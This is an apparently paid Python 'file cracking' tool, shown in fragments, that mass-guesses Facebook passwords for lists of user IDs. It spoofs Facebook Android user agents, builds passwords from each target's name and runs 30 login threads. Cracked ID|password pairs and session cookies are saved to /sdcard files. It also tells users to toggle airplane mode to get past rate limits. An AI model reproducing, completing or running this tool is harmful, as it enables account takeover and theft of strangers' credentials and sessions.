...
from concurrent.futures import ThreadPoolExecutor as EVANgod
from string import * 
...
def randBuildvsskj():
    END = '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/242.0.0.43.119;FBBV/176515222;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/177156964;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;"+"[FBAN/FB4A;FBAV/160.1.80.24.874;FBBV/4214829694;FBDM/{density=2.5,width=780,height=1920};FBLC/ca_MY;FBRV/4214899694;FBCR/1030;FBMF/Oppo;FBBD/Itel;FBPN/com.facebook.katana;FBDV/Ostin Realme 5;FBSV/7;FBOP/5;FBCA/arm64-v8a:;]"+"[FBAN/EMA;FBBV/358923683;FBAV/291.0.0.12.110;FBDV/SM-T885ES;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]"+"[FBAN/Orca-Android;FBAV/137.0.0.1570;FBBV/5827446;[FBAN/Orca-Android;FBAV/364.0.0.10.112;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/374667243;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-C5010;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]"+"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I337M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/Meteor;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1039;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/79.64.90.34;FBBV/20454004;FBDM/{density=2.0,width=800,height=12070};FBLC/en_LS;FBCR/;FBMF/SONY;FBBD/Panasonic;FBPN/com.facebook.katana;FBDV/;FBCA/]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

sys.stdout.write('\x1b]2; EVAN\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo =                                    """            
\033[1;32m      888888   dP88  88""Yb 88b 88          88888 88888 
\033[1;33m      88__    dP 88  88__dP 88Yb88 ________   .dP   .dP 
\033[1;34m      88""   d888888 88""Yb 88 Y88 """"""""       o Yb o `Yb 
\033[1;35m      888888     88  88oodP 88  Y8          YbodP YbodP 
\033[1;32m-------------------------
\033[1;34m[\033[1;32m✓\033[1;37m]AUTHOR :\033[1;36m E4BN-33
\033[1;32m[\033[1;32m✓\033[1;37m]TYPE    :\033[1;32m PAID
\033[1;31m--------------------------"""
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("PRESS ENTER TO BACK EVAN GOD MENU ")
        exit()
...
def EVAN():   
    os.system('clear')
    print(logo)
    print(f'[A]FILE CRACKING')
    print(f'[F]CONTACT ON FACEBOOK')
    print('')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ EVAN ] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    oks.append(sid)
                    open('/sdcard/EVAN_OK_IDs_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/EVAN_IDs_COOKIES_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [EVAN-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/EVAN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ EVAN ] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    #print("\r\r\033[1;36m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/EVAN_OK_IDs_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/EVAN_IDs_COOKIES_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [EVAN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ EVAN ] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[ EVAN ] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    #print("\r\r\033[1;36m[COOKIE] : "+ckkk)
                    oks.append(sid)
                    open('/sdcard/EVAN_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(f"\r{S}USE FLIGHT (AIRPLANE) AND AUTOCLICKER FOR BEST IDZ{S}")
            print(47*"-")
            print(f'{S} TOTAL IDs : %s ' % len(self.id))
            print(f'{S} CRACKING STARTED...')
            print(47*"-")
            with EVANgod(max_workers=30) as EVANworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                EVANworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                EVANworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                EVANworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                EVANworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)               
